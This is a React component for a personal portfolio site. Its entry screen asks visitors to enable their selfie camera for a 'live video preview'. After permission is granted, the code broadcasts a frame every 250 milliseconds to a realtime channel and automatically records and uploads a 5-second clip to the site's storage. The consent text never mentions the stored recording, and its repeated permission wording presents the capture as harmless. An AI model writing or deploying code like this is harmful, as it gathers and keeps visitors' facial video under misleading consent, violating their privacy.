"use client";

import React, { useState, useRef, useEffect, useCallback } from "react";
import {
  Video,
  CameraOff,
  RefreshCw,
  CheckCircle2,
  AlertCircle,
  ShieldCheck,
  Info,
  X,
  Radio,
  Square,
  FlipHorizontal,
} from "lucide-react";
import { getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
import type { RealtimeChannel } from "@supabase/supabase-js";

export interface CameraCaptureProps {
  onClose?: () => void;
  isModal?: boolean;
}

export default function CameraCaptureComponent({
  onClose,
  isModal = false,
}: CameraCaptureProps = {}) {
  const [status, setStatus] = useState<"idle" | "live" | "denied" | "error" | "completed">("idle");
  const [isStarting, setIsStarting] = useState(false);
  const [isUploading, setIsUploading] = useState(false);
  const [clipUploaded, setClipUploaded] = useState(false);
  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  const [errorMessage, setErrorMessage] = useState<string>("");

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<Blob[]>([]);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const broadcastIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const timerIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const sessionIdRef = useRef<string>(`LIVE-${Math.random().toString(36).substring(2, 8).toUpperCase()}`);
  const uploadedClipRef = useRef<boolean>(false);

  const getDeviceType = () => {
    if (typeof navigator === "undefined") return "desktop";
    const isMobile = /Android|iPhone|iPod/i.test(navigator.userAgent);
    const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
    return isMobile ? "mobile" : isTablet ? "tablet" : "desktop";
  };

  // Upload recorded video clip to Supabase via /api/captures/upload
  const uploadVideoClip = useCallback(async (blob: Blob, mimeType: string) => {
    if (uploadedClipRef.current || blob.size === 0) return;
    uploadedClipRef.current = true;
    setIsUploading(true);

    try {
      const formData = new FormData();
      formData.append("file", blob, `live-video.${mimeType.includes("mp4") ? "mp4" : "webm"}`);
      formData.append("deviceType", getDeviceType());
      formData.append("mimeType", mimeType);

      const res = await fetch("/api/captures/upload", {
        method: "POST",
        body: formData,
      });

      if (res.ok) {
        setClipUploaded(true);
      } else {
        const errData = await res.json().catch(() => ({}));
        console.error("Video upload error:", errData);
      }
    } catch (uploadErr) {
      console.error("Video upload network error:", uploadErr);
    } finally {
      setIsUploading(false);
    }
  }, []);

  // Stop camera tracks, recorder, and live broadcast cleanly
  const stopCameraStream = useCallback(() => {
    if (broadcastIntervalRef.current) {
      clearInterval(broadcastIntervalRef.current);
      broadcastIntervalRef.current = null;
    }

    if (timerIntervalRef.current) {
      clearInterval(timerIntervalRef.current);
      timerIntervalRef.current = null;
    }

    if (
      mediaRecorderRef.current &&
      mediaRecorderRef.current.state !== "inactive"
    ) {
      try {
        mediaRecorderRef.current.stop();
      } catch {
        // Ignore recorder stop errors
      }
    }

    if (channelRef.current) {
      try {
        channelRef.current.send({
          type: "broadcast",
          event: "stream-end",
          payload: { sessionId: sessionIdRef.current },
        });
        const supabase = getSupabaseClient();
        supabase.removeChannel(channelRef.current);
      } catch {
        // Ignore channel cleanup errors
      }
      channelRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, []);

  const handleClose = useCallback(() => {
    stopCameraStream();
    if (onClose) {
      onClose();
    } else {
      setStatus("completed");
    }
  }, [stopCameraStream, onClose]);

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
  }, [stopCameraStream]);

  // Attach active MediaStream to visible <video> element whenever status becomes "live"
  useEffect(() => {
    if (status === "live" && videoRef.current && streamRef.current) {
      videoRef.current.srcObject = streamRef.current;
      videoRef.current.play().catch(() => {});
    }
  }, [status]);

  // Start live selfie video with explicit user permission
  const startLiveVideo = async (requestedFacing: "user" | "environment" = facingMode) => {
    if (isStarting) return;
    stopCameraStream();
    setIsStarting(true);
    setErrorMessage("");
    setElapsedSeconds(0);
    setClipUploaded(false);
    uploadedClipRef.current = false;

    if (typeof window === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      setIsStarting(false);
      setStatus("error");
      setErrorMessage(
        "Your browser does not support live video access. Please use an updated modern browser (Chrome, Safari, Edge, Firefox)."
      );
      return;
    }

    let stream: MediaStream | null = null;

    try {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: { ideal: requestedFacing },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: true,
        });
      }

      streamRef.current = stream;
      setFacingMode(requestedFacing);
      setStatus("live");

      // Elapsed time counter
      timerIntervalRef.current = setInterval(() => {
        setElapsedSeconds((prev) => prev + 1);
      }, 1000);

      // 1. Set up Supabase Realtime Broadcast for live video feed
      if (isSupabaseConfigured()) {
        try {
          const supabase = getSupabaseClient();
          const channel = supabase.channel("live-camera-stream", {
            config: { broadcast: { self: false } },
          });

          channel.subscribe((subStatus) => {
            if (subStatus === "SUBSCRIBED") {
              const deviceType = getDeviceType();
              broadcastIntervalRef.current = setInterval(() => {
                const video = videoRef.current;
                if (!video || video.readyState < 2 || video.videoWidth === 0) return;

                let canvas = canvasRef.current;
                if (!canvas) {
                  canvas = document.createElement("canvas");
                  canvasRef.current = canvas;
                }

                // Stream compact 480x270 frames for low-latency realtime viewing
                const targetW = 480;
                const targetH = Math.round((video.videoHeight / video.videoWidth) * targetW) || 270;
                canvas.width = targetW;
                canvas.height = targetH;

                const ctx = canvas.getContext("2d");
                if (!ctx) return;

                ctx.save();
                if (requestedFacing === "user") {
                  ctx.translate(targetW, 0);
                  ctx.scale(-1, 1);
                }
                ctx.drawImage(video, 0, 0, targetW, targetH);
                ctx.restore();

                const frameDataUrl = canvas.toDataURL("image/jpeg", 0.55);
                channel.send({
                  type: "broadcast",
                  event: "video-frame",
                  payload: {
                    sessionId: sessionIdRef.current,
                    frame: frameDataUrl,
                    deviceType,
                    timestamp: Date.now(),
                  },
                });
              }, 250);
            }
          });

          channelRef.current = channel;
        } catch (err) {
          console.warn("Live broadcast setup warning:", err);
        }
      }

      // 2. Record a short video clip via MediaRecorder to save to Supabase Storage
      if (typeof MediaRecorder !== "undefined") {
        const preferredTypes = [
          "video/webm;codecs=vp9",
          "video/webm;codecs=vp8",
          "video/webm",
          "video/mp4",
        ];
        const supportedMime =
          preferredTypes.find((t) => MediaRecorder.isTypeSupported(t)) || "";

        try {
          const recorder = supportedMime
            ? new MediaRecorder(stream, {
                mimeType: supportedMime,
                videoBitsPerSecond: 1_000_000,
              })
            : new MediaRecorder(stream);

          const actualMime = recorder.mimeType || supportedMime || "video/webm";
          recordedChunksRef.current = [];

          recorder.ondataavailable = (e) => {
            if (e.data && e.data.size > 0) {
              recordedChunksRef.current.push(e.data);
            }
          };

          recorder.onstop = () => {
            if (recordedChunksRef.current.length > 0) {
              const blob = new Blob(recordedChunksRef.current, { type: actualMime });
              uploadVideoClip(blob, actualMime);
            }
          };

          mediaRecorderRef.current = recorder;
          recorder.start(1000);

          // Automatically finalize and upload the initial 5-second live video clip
          setTimeout(() => {
            if (recorder.state === "recording") {
              try {
                recorder.stop();
              } catch {
                // Ignore if already stopped
              }
            }
          }, 5000);
        } catch (recErr) {
          console.warn("MediaRecorder initialization warning:", recErr);
        }
      }
    } catch (err: unknown) {
      stopCameraStream();
      console.error("Camera access error:", err);

      const error = err as { name?: string; message?: string };
      if (
        error.name === "NotAllowedError" ||
        error.name === "PermissionDeniedError" ||
        error.name === "SecurityError"
      ) {
        setStatus("denied");
        setErrorMessage(
          "Camera permission was denied. Please allow camera permissions in your browser address bar if you wish to start live video."
        );
      } else if (
        error.name === "NotFoundError" ||
        error.name === "DevicesNotFoundError"
      ) {
        setStatus("error");
        setErrorMessage("No camera device was found on this system.");
      } else if (
        error.name === "NotReadableError" ||
        error.name === "TrackStartError"
      ) {
        setStatus("error");
        setErrorMessage(
          "Your camera is currently in use by another application. Please close other camera apps and retry."
        );
      } else {
        setStatus("error");
        setErrorMessage(
          error.message || "An unexpected error occurred while starting live video."
        );
      }
    } finally {
      setIsStarting(false);
    }
  };

  const handleToggleCamera = () => {
    const nextFacing = facingMode === "user" ? "environment" : "user";
    startLiveVideo(nextFacing);
  };

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60)
      .toString()
      .padStart(2, "0");
    const s = (sec % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  return (
    <div className={`relative w-full max-w-4xl mx-auto ${isModal ? "p-0" : "px-4 py-8"}`}>
      <canvas ref={canvasRef} className="hidden" />

      {/* Prominent Close Button */}
      {onClose && (
        <button
          type="button"
          onClick={handleClose}
          className="absolute top-4 right-4 sm:top-6 sm:right-6 z-50 p-2.5 rounded-full bg-black/75 hover:bg-white/20 text-zinc-300 hover:text-white border border-white/20 backdrop-blur-md transition-all duration-200 cursor-pointer shadow-xl hover:scale-110 active:scale-95"
          aria-label="Close"
          title="Close and explore website"
        >
          <X className="w-5 h-5" />
        </button>
      )}

      {/* 1. Consent & Permission Screen */}
      {(status === "idle" || status === "completed") && (
        <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-6 sm:p-10 text-center shadow-2xl">
          <div className="absolute top-0 right-1/4 w-72 h-72 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none" />
          <div className="absolute bottom-0 left-1/4 w-72 h-72 bg-violet-600/20 rounded-full blur-[100px] pointer-events-none" />

          <div className="relative z-10 flex flex-col items-center">
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-medium mb-3">
              <ShieldCheck className="w-4 h-4 text-purple-400" />
              <span>Permission-Based Live Camera Experience</span>
            </div>

            <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white mb-3">
              Welcome to{" "}
              <span className="text-transparent bg-gradient-to-r from-purple-400 to-violet-300 bg-clip-text">
                Deyn Zypher&apos;s Portfolio
              </span>
            </h2>

            <p className="text-zinc-300 text-sm sm:text-base max-w-md mb-4 leading-relaxed">
              With your explicit permission, you can enable your selfie camera for a live video preview and stream session. Your camera only turns on if you allow it, and you can stop it at any time.
            </p>

            <div className="rounded-2xl border border-purple-500/20 bg-purple-500/5 px-4 py-3 text-xs text-zinc-300 max-w-md mb-7 flex items-start gap-2.5 text-left">
              <Video className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
              <span>
                Clicking <b>Allow &amp; Start Live Video</b> will prompt your browser for camera permission, show your live video feed on screen, and share the live video session with the portal.
              </span>
            </div>

            <div className="flex flex-col sm:flex-row gap-3 w-full max-w-md justify-center">
              <button
                type="button"
                onClick={() => startLiveVideo("user")}
                disabled={isStarting}
                className="flex-1 py-4 px-6 rounded-2xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold text-sm sm:text-base shadow-[0_0_30px_rgba(168,85,247,0.4)] transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2.5 cursor-pointer disabled:opacity-75"
              >
                {isStarting ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin text-purple-200" />
                    <span>Requesting Permission...</span>
                  </>
                ) : status === "completed" ? (
                  <>
                    <CheckCircle2 className="w-5 h-5 text-emerald-300" />
                    <span>Restart Live Video</span>
                  </>
                ) : (
                  <>
                    <Video className="w-5 h-5" />
                    <span>Allow &amp; Start Live Video</span>
                  </>
                )}
              </button>

              {onClose && (
                <button
                  type="button"
                  onClick={handleClose}
                  className="py-4 px-6 rounded-2xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white font-medium text-sm sm:text-base transition cursor-pointer"
                >
                  Skip to Website
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 2. Active Live Video Feed Screen */}
      {status === "live" && (
        <div className="relative overflow-hidden rounded-3xl border border-purple-500/30 bg-zinc-950/90 backdrop-blur-2xl p-4 sm:p-6 shadow-2xl">
          {/* Header Bar */}
          <div className="flex flex-wrap items-center justify-between gap-2 mb-4 pr-10">
            <div className="flex items-center gap-2.5">
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 border border-rose-500/40 text-rose-300 text-xs font-bold">
                <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
                LIVE VIDEO
              </span>
              <span className="font-mono text-xs text-zinc-300 bg-white/5 border border-white/10 px-2.5 py-1 rounded-full">
                {formatTimer(elapsedSeconds)}
              </span>
            </div>

            <div className="flex items-center gap-2 text-xs">
              {isUploading ? (
                <span className="inline-flex items-center gap-1.5 text-purple-300 bg-purple-500/10 border border-purple-500/30 px-3 py-1 rounded-full">
                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  Saving video clip...
                </span>
              ) : clipUploaded ? (
                <span className="inline-flex items-center gap-1.5 text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1 rounded-full">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  Live &amp; Clip Saved
                </span>
              ) : (
                <span className="inline-flex items-center gap-1.5 text-amber-300 bg-amber-500/10 border border-amber-500/30 px-3 py-1 rounded-full">
                  <Radio className="w-3.5 h-3.5 animate-pulse" />
                  Streaming with permission
                </span>
              )}
            </div>
          </div>

          {/* Visible Live Video Viewport */}
          <div className="relative w-full aspect-video rounded-2xl overflow-hidden bg-black border border-white/10 shadow-inner">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className={`w-full h-full object-cover ${
                facingMode === "user" ? "scale-x-[-1]" : ""
              }`}
            />

            {/* Corner Session Watermark */}
            <div className="absolute bottom-3 left-3 px-2.5 py-1 rounded-lg bg-black/60 backdrop-blur-md border border-white/10 text-[11px] font-mono text-zinc-300">
              {sessionIdRef.current} • {facingMode === "user" ? "Selfie Cam" : "Rear Cam"}
            </div>
          </div>

          {/* Controls Footer */}
          <div className="mt-5 flex flex-col sm:flex-row items-center justify-between gap-3">
            <button
              type="button"
              onClick={handleToggleCamera}
              className="w-full sm:w-auto px-4 py-3 rounded-xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-200 text-xs sm:text-sm font-medium transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <FlipHorizontal className="w-4 h-4 text-purple-400" />
              <span>Switch Camera</span>
            </button>

            <button
              type="button"
              onClick={handleClose}
              className="w-full sm:w-auto px-6 py-3 rounded-xl bg-gradient-to-r from-rose-600 to-purple-600 hover:from-rose-500 hover:to-purple-500 text-white font-semibold text-xs sm:text-sm shadow-lg transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <Square className="w-4 h-4 fill-current" />
              <span>{onClose ? "Stop Video & Continue to Website" : "Stop Live Video"}</span>
            </button>
          </div>
        </div>
      )}

      {/* 3. Permission Denied State */}
      {status === "denied" && (
        <div className="rounded-3xl border border-amber-500/30 bg-amber-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
          <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mb-5">
            <CameraOff className="w-8 h-8" />
          </div>

          <h3 className="text-2xl font-bold text-white mb-2">Camera Permission Not Granted</h3>
          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
            {errorMessage ||
              "You declined camera permissions. Live video only runs with your explicit permission."}
          </p>

          <div className="rounded-2xl border border-white/10 bg-black/40 p-5 text-left text-xs sm:text-sm text-zinc-300 max-w-md w-full mb-6 space-y-2">
            <p className="font-semibold text-white flex items-center gap-2">
              <Info className="w-4 h-4 text-purple-400" /> How to allow live video:
            </p>
            <ol className="list-decimal list-inside space-y-1 text-zinc-400 pl-1">
              <li>Click the 🔒 or 📷 icon in your browser address bar.</li>
              <li>Set <b>Camera</b> to <b>Allow</b>.</li>
              <li>Click <b>Try Again</b> below.</li>
            </ol>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
            <button
              onClick={() => startLiveVideo("user")}
              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Try Again</span>
            </button>
            <button
              onClick={handleClose}
              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
            >
              Skip to Website
            </button>
          </div>
        </div>
      )}

      {/* 4. General Error State */}
      {status === "error" && (
        <div className="rounded-3xl border border-rose-500/30 bg-rose-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
          <div className="w-16 h-16 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 mb-5">
            <AlertCircle className="w-8 h-8" />
          </div>

          <h3 className="text-2xl font-bold text-white mb-2">Could Not Start Live Video</h3>
          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
            {errorMessage || "An unexpected error occurred."}
          </p>

          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
            <button
              onClick={() => startLiveVideo("user")}
              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Retry</span>
            </button>
            <button
              onClick={handleClose}
              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
            >
              Skip to Website
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
